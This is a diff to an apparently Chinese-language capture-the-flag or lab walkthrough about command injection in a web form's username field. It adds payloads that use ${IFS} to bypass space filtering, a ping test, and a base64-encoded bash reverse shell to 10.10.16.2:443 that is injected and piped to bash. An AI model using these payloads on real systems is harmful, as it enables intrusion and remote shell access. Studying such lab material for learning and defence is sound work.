@@ -262,6 +262,26 @@ Upgrade-Insecure-Requests: 1
 host=127.0.0.1&username=kanderson
 ```
 
-命令注入
+命令注入。
+使用${IFS}分隔符可以绕过命令注入里的空格，执行任意系统命令
 
-host=127.0.0.1&username=kanderson;`ls`;
+下面命令返回ping包
+```
+host=127.0.0.1&username=kanderson;ping${IFS}-c4${IFS}10.10.16.2;#
+```
+
+加密shell命令：
+
+```
+┌──(root㉿max)-[~]
+└─# echo "bash -i >& /dev/tcp/10.10.16.2/443 0>&1" | base64 -w 0 
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzQ0MyAwPiYxCg==  
+```
+
+rev shell paylao
+
+```
+;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yLzQ0MyAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+```
+
+
